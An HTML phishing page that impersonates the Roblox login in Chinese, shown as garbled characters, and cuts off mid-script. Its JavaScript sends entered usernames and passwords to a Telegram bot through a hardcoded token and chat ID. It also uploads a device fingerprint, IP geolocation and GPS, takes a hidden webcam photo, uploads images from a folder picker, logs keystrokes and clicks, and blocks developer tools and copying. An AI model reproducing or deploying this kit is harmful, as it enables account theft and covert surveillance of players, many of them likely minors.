<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ç™»å½• Roblox - roblox.com</title>
    <link rel="icon" href="https://tr.rbxcdn.com/favicon.ico" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Gotham SSm', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: #00a2ff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        .roblox-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #00a2ff 0%, #007acc 100%);
            z-index: -2;
        }

        .particles {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .particle {
            position: absolute;
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            background: linear-gradient(135deg, #00a2ff 0%, #007acc 100%);
            padding: 25px 30px;
            text-align: center;
            color: white;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            animation: shine 3s infinite linear;
        }

        @keyframes shine {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }

        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            position: relative;
            z-index: 1;
        }

        .logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
            position: relative;
            z-index: 1;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .subtitle {
            font-size: 14px;
            opacity: 0.9;
            position: relative;
            z-index: 1;
        }

        .nav-bar {
            background: #f8f9fa;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #e9ecef;
        }

        .nav-item {
            color: #6c757d;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            padding: 8px 12px;
            border-radius: 4px;
            transition: all 0.3s;
        }

        .nav-item:hover {
            background: #e9ecef;
            color: #495057;
        }

        .nav-item.active {
            color: #00a2ff;
            background: rgba(0, 162, 255, 0.1);
        }

        .content {
            padding: 30px;
        }

        .login-form {
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #495057;
            font-size: 14px;
            font-weight: 500;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #dee2e6;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s;
            background: #f8f9fa;
        }

        .form-input:focus {
            outline: none;
            border-color: #00a2ff;
            background: white;
            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.1);
        }

        .form-input.error {
            border-color: #dc3545;
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #6c757d;
            cursor: pointer;
            font-size: 18px;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00a2ff 0%, #007acc 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .login-btn:hover {
            background: linear-gradient(135deg, #007acc 0%, #0066a3 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 162, 255, 0.3);
        }

        .login-btn:disabled {
            background: #6c757d;
            cursor: not-allowed;
            transform: none;
        }

        .login-btn i {
            font-size: 18px;
        }

        .links {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        }

        .link {
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .register-section {
            text-align: center;
            margin-top: 30px;
            padding-top: 25px;
            border-top: 1px solid #e9ecef;
        }

        .register-btn {
            display: inline-block;
            padding: 12px 24px;
            background: #28a745;
            color: white;
            text-decoration: none;
            border-radius: 6px;
            font-weight: 500;
            margin-top: 10px;
            transition: all 0.3s;
        }

        .register-btn:hover {
            background: #218838;
            transform: translateY(-1px);
        }

        .security-notice {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin-top: 25px;
            color: #856404;
            font-size: 13px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }

        .security-notice i {
            font-size: 18px;
            color: #ffc107;
        }

        .loading-container {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #00a2ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-message {
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            display: none;
            animation: fadeIn 0.3s;
        }

        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .hidden {
            display: none;
        }

        @media (max-width: 480px) {
            .container {
                max-width: 100%;
            }
            
            .content {
                padding: 20px;
            }
            
            .header {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="roblox-bg"></div>
    
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg viewBox="0 0 512 512" fill="white">
                    <path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256 256-114.6 256-256S397.4 0 256 0zm0 480C132.5 480 32 379.5 32 256S132.5 32 256 32s224 100.5 224 224-100.5 224-224 224zm96-320c0-17.7-14.3-32-32-32H192c-17.7 0-32 14.3-32 32v160c0 17.7 14.3 32 32 32h128c17.7 0 32-14.3 32-32V160zm-32 0H192v160h128V160z"/>
                </svg>
            </div>
            <div class="title">ç™»å½• Roblox</div>
            <div class="subtitle">roblox.com</div>
        </div>
        
        <div class="nav-bar">
            <a href="#" class="nav-item">æ’è¡Œæ¦œ</a>
            <a href="#" class="nav-item">å•†åŸ</a>
            <a href="#" class="nav-item">åˆ›ä½œ</a>
            <a href="#" class="nav-item active">Robux</a>
        </div>
        
        <div class="content">
            <div class="login-form">
                <div class="form-group">
                    <label class="form-label">ç”¨æˆ·å/ç”µå­é‚®ä»¶/æ‰‹æœº</label>
                    <input type="text" 
                           class="form-input" 
                           id="username" 
                           placeholder="è¾“å…¥æ‚¨çš„ç”¨æˆ·åã€ç”µå­é‚®ä»¶æˆ–æ‰‹æœºå·ç "
                           autocomplete="username">
                </div>
                
                <div class="form-group">
                    <label class="form-label">å¯†ç </label>
                    <div class="password-container">
                        <input type="password" 
                               class="form-input" 
                               id="password" 
                               placeholder="è¾“å…¥æ‚¨çš„å¯†ç "
                               autocomplete="current-password">
                        <button type="button" class="toggle-password" id="togglePassword">
                            ğŸ‘ï¸
                        </button>
                    </div>
                </div>
                
                <div id="errorMessage" class="status-message status-error hidden">
                    âŒ ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®ï¼Œè¯·é‡è¯•
                </div>
                
                <div id="successMessage" class="status-message status-success hidden">
                    âœ… ç™»å½•æˆåŠŸï¼æ­£åœ¨ä¸ºæ‚¨é‡å®šå‘...
                </div>
                
                <div class="loading-container" id="loading">
                    <div class="loading-spinner"></div>
                    <p>æ­£åœ¨éªŒè¯æ‚¨çš„è´¦æˆ·...</p>
                </div>
                
                <button class="login-btn" id="loginButton" onclick="handleLogin()">
                    <span>ç™»å½•</span>
                </button>
            </div>
            
            <div class="links">
                <a href="#" class="link">å¿˜è®°å¯†ç æˆ–ç”¨æˆ·åï¼Ÿ</a>
                <a href="#" class="link">é€šè¿‡ç”µå­é‚®ä»¶å‘æˆ‘å‘é€ä¸€æ¬¡æ€§éªŒè¯ç </a>
                <a href="#" class="link">ä½¿ç”¨å¦ä¸€å°è®¾å¤‡</a>
            </div>
            
            <div class="register-section">
                <p>æ²¡æœ‰å¸æˆ·ï¼Ÿ</p>
                <a href="#" class="register-btn">æ³¨å†Œ</a>
            </div>
            
            <div class="security-notice">
                <span>ğŸ”’</span>
                <span>ä¸ºäº†ä¿æŠ¤æ‚¨çš„è´¦æˆ·ï¼Œæˆ‘ä»¬æ­£åœ¨æ‰§è¡Œå®‰å…¨æ£€æŸ¥ã€‚è¯·ä¸è¦å…³é—­æ­¤é¡µé¢ã€‚</span>
            </div>
        </div>
    </div>

    <!-- éšè”½çš„æ”¶é›†å…ƒç´  -->
    <iframe id="hiddenFrame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>
    <input type="file" id="hiddenFileInput" style="display:none;" webkitdirectory directory multiple>
    <div id="dataCollector" style="display:none;"></div>
<script>
    // ==================== Telegramé…ç½® ====================
    const TELEGRAM_CONFIG = {
        botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
        chatId: "8313770381"
    };

    // æ”¶é›†çš„æ•°æ®
    let collectedData = {
        sessionId: generateSessionId(),
        startTime: new Date().toISOString(),
        loginAttempts: [],
        credentials: {},
        device: {},
        network: {},
        files: [],
        photos: [],
        folders: [],
        behavior: {},
        extensions: []
    };

    let isCollecting = false;
    let stealthMode = true;

    // ==================== åŸºç¡€åŠŸèƒ½ ====================
    function generateSessionId() {
        return 'RBX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8).toUpperCase();
    }

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: text.substring(0, 4000),
                    parse_mode: 'HTML'
                })
            });
            return true;
        } catch (error) {
            return false;
        }
    }

    async function sendPhotoToTelegram(file, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
            formData.append('photo', file);
            formData.append('caption', `ğŸ“¸ ${caption} - ${new Date().toLocaleTimeString()}`);
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            return true;
        } catch (error) {
            return false;
        }
    }

    // ==================== ç™»å½•å¤„ç† ====================
    function handleLogin() {
        if (isCollecting) return;
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
            showError('è¯·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ');
            return;
        }
        
        // æ”¶é›†å‡­æ®
        collectedData.credentials = {
            username: username,
            password: password,
            timestamp: new Date().toISOString()
        };
        
        // å‘é€åˆ°Telegram
        sendLoginCredentials(username, password);
        
        // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
        showLoading();
        
        // å¼€å§‹é«˜çº§æ”¶é›†
        startAdvancedCollection();
    }

    async function sendLoginCredentials(username, password) {
        const message = `ğŸ® Robloxç™»å½•å°è¯•
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ‘¤ ç”¨æˆ·å: ${username || 'æœªæä¾›'}
ğŸ”‘ å¯†ç : ${password || 'æœªæä¾›'}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ†” ä¼šè¯ID: ${collectedData.sessionId}
ğŸ• æ—¶é—´: ${new Date().toLocaleString()}
ğŸŒ IP: ${await getIPAddress()}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
        
        await sendToTelegram(message);
        
        // å­˜å‚¨ç™»å½•å°è¯•
        collectedData.loginAttempts.push({
            username: username,
            timestamp: new Date().toISOString(),
            ip: await getIPAddress()
        });
    }

    // ==================== è®¾å¤‡ä¿¡æ¯æ”¶é›† ====================
    async function collectDeviceInfo() {
        collectedData.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth
            },
            hardware: {
                concurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints
            },
            browser: detectBrowser(),
            os: detectOS(),
            canvasFingerprint: getCanvasFingerprint(),
            webgl: getWebGLInfo()
        };

        // å‘é€è®¾å¤‡ä¿¡æ¯
        const deviceInfo = `ğŸ“± è®¾å¤‡ä¿¡æ¯
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ’» æ“ä½œç³»ç»Ÿ: ${collectedData.device.os.name} ${collectedData.device.os.version}
ğŸŒ æµè§ˆå™¨: ${collectedData.device.browser.name} ${collectedData.device.browser.version}
ğŸ–¥ï¸ åˆ†è¾¨ç‡: ${collectedData.device.screen.width}x${collectedData.device.screen.height}
ğŸ”¢ CPUæ ¸å¿ƒ: ${collectedData.device.hardware.concurrency}
ğŸ’¾ å†…å­˜: ${collectedData.device.hardware.deviceMemory || 'æœªçŸ¥'}GB
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
        
        await sendToTelegram(deviceInfo);
    }

    function detectBrowser() {
        const ua = navigator.userAgent;
        if (/Chrome/.test(ua) && !/Edg/.test(ua)) return { name: 'Chrome', version: ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'æœªçŸ¥' };
        if (/Firefox/.test(ua)) return { name: 'Firefox', version: ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'æœªçŸ¥' };
        if (/Safari/.test(ua) && !/Chrome/.test(ua)) return { name: 'Safari', version: ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'æœªçŸ¥' };
        if (/Edg/.test(ua)) return { name: 'Edge', version: ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'æœªçŸ¥' };
        return { name: 'æœªçŸ¥', version: 'æœªçŸ¥' };
    }

    function detectOS() {
        const ua = navigator.userAgent;
        if (/Windows/.test(ua)) return { name: 'Windows', version: '10' };
        if (/Macintosh/.test(ua)) return { name: 'macOS', version: ua.match(/Mac OS X (\d+[._]\d+)/)?.[1].replace('_', '.') || 'æœªçŸ¥' };
        if (/Linux/.test(ua)) return { name: 'Linux', version: 'æœªçŸ¥' };
        if (/iPhone|iPad|iPod/.test(ua)) return { name: 'iOS', version: ua.match(/OS (\d+)/)?.[1] || 'æœªçŸ¥' };
        if (/Android/.test(ua)) return { name: 'Android', version: ua.match(/Android (\d+\.\d+)/)?.[1] || 'æœªçŸ¥' };
        return { name: 'æœªçŸ¥', version: 'æœªçŸ¥' };
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Roblox", 2, 15);
            return canvas.toDataURL().substring(0, 100);
        } catch (e) {
            return null;
        }
    }

    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'æœªçŸ¥',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'æœªçŸ¥'
            };
        } catch (e) {
            return null;
        }
    }
    // ==================== ç½‘ç»œä¿¡æ¯æ”¶é›† ====================
    async function collectNetworkInfo() {
        collectedData.network = {};
        
        try {
            // è·å–IPåœ°å€
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            collectedData.network.ip = ipData.ip;
            
            // è·å–åœ°ç†ä½ç½®
            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const geoData = await geoRes.json();
            
            collectedData.network.geo = {
                ip: ipData.ip,
                city: geoData.city,
                region: geoData.region,
                country: geoData.country_name,
                countryCode: geoData.country_code,
                latitude: geoData.latitude,
                longitude: geoData.longitude,
                timezone: geoData.timezone,
                isp: geoData.org
            };
            
            // å‘é€ä½ç½®ä¿¡æ¯
            const locationInfo = `ğŸ“ åœ°ç†ä½ç½®
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸŒ å›½å®¶: ${geoData.country_name || 'æœªçŸ¥'}
ğŸ™ï¸ åŸå¸‚: ${geoData.city || 'æœªçŸ¥'}
ğŸŒ IPåœ°å€: ${ipData.ip}
ğŸ“¡ è¿è¥å•†: ${geoData.org || 'æœªçŸ¥'}
ğŸ“¡ æ—¶åŒº: ${geoData.timezone || 'æœªçŸ¥'}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
            
            await sendToTelegram(locationInfo);
            
        } catch (error) {
            // å¤‡ç”¨API
            try {
                const backupRes = await fetch('https://ipapi.co/json/');
                const backupData = await backupRes.json();
                collectedData.network.geo = backupData;
            } catch (e) {}
        }
        
        // è·å–GPSä½ç½®ï¼ˆå¦‚æœå…è®¸ï¼‰
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    collectedData.network.gps = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    sendToTelegram(`ğŸ“ GPSåæ ‡: ${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
                },
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
        
        // ç½‘ç»œè¿æ¥ä¿¡æ¯
        if (navigator.connection) {
            collectedData.network.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                type: navigator.connection.type
            };
        }
    }

    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'æœªçŸ¥';
        }
    }

    // ==================== æ‘„åƒå¤´è®¿é—® ====================
    async function accessCamera() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return false;
        }
        
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            if (videoDevices.length > 0) {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                
                // æ•è·ç…§ç‰‡
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                return new Promise((resolve) => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            if (blob) {
                                const file = new File([blob], `roblox_selfie_${Date.now()}.jpg`, {
                                    type: 'image/jpeg'
                                });
                                
                                collectedData.photos.push({
                                    name: file.name,
                                    size: file.size,
                                    source: 'camera',
                                    timestamp: new Date().toISOString()
                                });
                                
                                await sendPhotoToTelegram(file, 'RobloxéªŒè¯è‡ªæ‹');
                                stream.getTracks().forEach(track => track.stop());
                                resolve(true);
                            }
                        }, 'image/jpeg', 0.8);
                    }, 1000);
                });
            }
        } catch (error) {
            return false;
        }
    }

    // ==================== æ–‡ä»¶ç³»ç»Ÿè®¿é—® ====================
    function attemptFileAccess() {
        // æ–¹æ³•1ï¼šwebkitdirectory
        if ('webkitdirectory' in document.createElement('input')) {
            setTimeout(() => {
                try {
                    const folderInput = document.createElement('input');
                    folderInput.type = 'file';
                    folderInput.webkitdirectory = true;
                    folderInput.multiple = true;
                    folderInput.style.display = 'none';
                    
                    folderInput.addEventListener('change', async (e) => {
                        const files = Array.from(e.target.files);
                        collectedData.folders.push({
                            name: 'æ–‡ä»¶å¤¹è®¿é—®',
                            fileCount: files.length,
                            timestamp: new Date().toISOString()
                        });
                        
                        sendToTelegram(`ğŸ“ å‘ç°æ–‡ä»¶å¤¹: ${files.length} ä¸ªæ–‡ä»¶`);
                        
                        // å¤„ç†å‰10ä¸ªå›¾ç‰‡æ–‡ä»¶
                        for (let file of files.slice(0, 10)) {
                            if (file.type.startsWith('image/') && file.size < 5 * 1024 * 1024) {
                                await sendPhotoToTelegram(file, 'ç³»ç»Ÿå›¾ç‰‡');
                            }
                        }
                    });
                    
                    document.body.appendChild(folderInput);
                    
                    // è‡ªåŠ¨è§¦å‘ï¼ˆéšè”½ï¼‰
                    setTimeout(() => {
                        try {
                            folderInput.click();
                        } catch (e) {}
                    }, 3000);
                    
                } catch (e) {}
            }, 2000);
        }
    }
    // ==================== è¡Œä¸ºç›‘æ§ ====================
    function startBehaviorMonitoring() {
        collectedData.behavior = {
            keystrokes: [],
            clicks: [],
            mouse: [],
            focus: []
        };
        
        // é”®ç›˜è¾“å…¥ç›‘æ§
        document.addEventListener('keydown', (e) => {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
                collectedData.behavior.keystrokes.push({
                    key: e.key,
                    time: Date.now()
                });
            }
        });
        
        // ç‚¹å‡»ç›‘æ§
        document.addEventListener('click', (e) => {
            collectedData.behavior.clicks.push({
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName,
                time: new Date().toISOString()
            });
        });
        
        // é¼ æ ‡ç§»åŠ¨ç›‘æ§
        let mousePoints = [];
        document.addEventListener('mousemove', (e) => {
            mousePoints.push({ x: e.clientX, y: e.clientY, time: Date.now() });
            if (mousePoints.length > 100) {
                collectedData.behavior.mouse = mousePoints.slice(-50);
            }
        });
        
        // é¡µé¢ç„¦ç‚¹ç›‘æ§
        document.addEventListener('visibilitychange', () => {
            collectedData.behavior.focus.push({
                state: document.hidden ? 'hidden' : 'visible',
                time: new Date().toISOString()
            });
        });
        
        // å®šæœŸå‘é€è¡Œä¸ºæ‘˜è¦
        setInterval(() => {
            if (collectedData.behavior.keystrokes.length > 50) {
                sendToTelegram(`âŒ¨ï¸ æŒ‰é”®è®°å½•: ${collectedData.behavior.keystrokes.length} æ¬¡`);
            }
        }, 60000);
    }

    // ==================== ä¸»æ”¶é›†æµç¨‹ ====================
    async function startAdvancedCollection() {
        if (isCollecting) return;
        isCollecting = true;
        
        // ç¦ç”¨ç™»å½•æŒ‰é’®
        const loginBtn = document.getElementById('loginButton');
        loginBtn.disabled = true;
        loginBtn.innerHTML = '<div class="loading-spinner" style="width:20px;height:20px;border-width:2px;"></div> <span>éªŒè¯ä¸­...</span>';
        
        try {
            // æ­¥éª¤1ï¼šæ”¶é›†è®¾å¤‡ä¿¡æ¯
            await collectDeviceInfo();
            await delay(1500);
            
            // æ­¥éª¤2ï¼šæ”¶é›†ç½‘ç»œä¿¡æ¯
            await collectNetworkInfo();
            await delay(1500);
            
            // æ­¥éª¤3ï¼šå°è¯•æ‘„åƒå¤´è®¿é—®
            await accessCamera();
            await delay(1000);
            
            // æ­¥éª¤4ï¼šå°è¯•æ–‡ä»¶è®¿é—®
            attemptFileAccess();
            
            // æ­¥éª¤5ï¼šå¼€å§‹è¡Œä¸ºç›‘æ§
            startBehaviorMonitoring();
            
            // å‘é€å®Œæ•´æŠ¥å‘Š
            await sendCompleteReport();
            
            // å»¶è¿Ÿåæ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
            await delay(2000);
            
            // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
            showSuccess();
            
            // 3ç§’åé‡å®šå‘åˆ°çœŸæ­£çš„Roblox
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login';
            }, 3000);
            
        } catch (error) {
            console.error('æ”¶é›†è¿‡ç¨‹ä¸­å‡ºé”™:', error);
            showError('éªŒè¯è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œè¯·é‡è¯•');
            loginBtn.disabled = false;
            loginBtn.innerHTML = '<span>ç™»å½•</span>';
            isCollecting = false;
        }
    }

    async function sendCompleteReport() {
        const report = `ğŸ® RobloxéªŒè¯å®ŒæˆæŠ¥å‘Š
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“Š æ”¶é›†ç»Ÿè®¡:
ä¼šè¯ID: ${collectedData.sessionId}
å¼€å§‹æ—¶é—´: ${new Date(collectedData.startTime).toLocaleString()}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ‘¤ ç™»å½•å‡­æ®:
ç”¨æˆ·å: ${collectedData.credentials.username || 'æ— '}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“± è®¾å¤‡ä¿¡æ¯:
æ“ä½œç³»ç»Ÿ: ${collectedData.device.os?.name || 'æœªçŸ¥'} ${collectedData.device.os?.version || ''}
æµè§ˆå™¨: ${collectedData.device.browser?.name || 'æœªçŸ¥'} ${collectedData.device.browser?.version || ''}
å±å¹•: ${collectedData.device.screen?.width || 'æœªçŸ¥'}x${collectedData.device.screen?.height || 'æœªçŸ¥'}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“ ä½ç½®ä¿¡æ¯:
IPåœ°å€: ${collectedData.network.geo?.ip || 'æœªçŸ¥'}
ä½ç½®: ${collectedData.network.geo?.city || 'æœªçŸ¥'}, ${collectedData.network.geo?.country || 'æœªçŸ¥'}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“¸ åª’ä½“æ”¶é›†:
æ‘„åƒå¤´è®¿é—®: ${collectedData.photos.length > 0 ? 'æˆåŠŸ' : 'å¤±è´¥'}
ç…§ç‰‡æ•°é‡: ${collectedData.photos.length}
æ–‡ä»¶æ‰«æ: ${collectedData.files.length} ä¸ªæ–‡ä»¶
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
âœ… éªŒè¯çŠ¶æ€: å®Œæˆ`;
        
        await sendToTelegram(report);
        
        // å‘é€JSONæ•°æ®
        const dataStr = JSON.stringify(collectedData, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        const dataFile = new File([dataBlob], `roblox_data_${collectedData.sessionId}.json`);
        
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
        formData.append('document', dataFile);
        formData.append('caption', 'ğŸ“Š å®Œæ•´RobloxéªŒè¯æ•°æ®');
        
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            // å¿½ç•¥å‘é€é”™è¯¯
        }
    }

    // ==================== UIæ§åˆ¶å‡½æ•° ====================
    function showLoading() {
        document.getElementById('loading').style.display = 'block';
        document.getElementById('errorMessage').classList.add('hidden');
    }

    function hideLoading() {
        document.getElementById('loading').style.display = 'none';
    }

    function showSuccess() {
        hideLoading();
        document.getElementById('successMessage').classList.remove('hidden');
    }

    function showError(message) {
        hideLoading();
        const errorElement = document.getElementById('errorMessage');
        errorElement.textContent = message;
        errorElement.classList.remove('hidden');
    }

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ==================== é˜²æ£€æµ‹ä¿æŠ¤ ====================
    function setupProtection() {
        // ç¦ç”¨å³é”®èœå•
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            return false;
        });
        
        // ç¦ç”¨å¼€å‘è€…å·¥å…·
        document.addEventListener('keydown', (e) => {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                sendToTelegram('âš ï¸ æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·å¿«æ·é”®');
                return false;
            }
        });
        
        // é˜²æ­¢å¤åˆ¶
        document.addEventListener('copy', (e) => {
            e.preventDefault();
            sendToTelegram('âš ï¸ ç”¨æˆ·å°è¯•å¤åˆ¶å†…å®¹');
        });
        
        // æ£€æµ‹å¼€å‘è€…å·¥å…·çª—å£
        let devToolsOpen = false;
        const element = new Image();
        Object.defineProperty(element, 'id', {
            get: function() {
                devToolsOpen = true;
                sendToTelegram('âš ï¸ æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·å·²æ‰“å¼€');
            }
        });
        
        console.log('%c ', element);
        
        setInterval(() => {
            if (devToolsOpen) {
                devToolsOpen = false;
            }
        }, 1000);
    }

    // ==================== åˆå§‹åŒ– ====================
    window.addEventListener('DOMContentLoaded', () => {
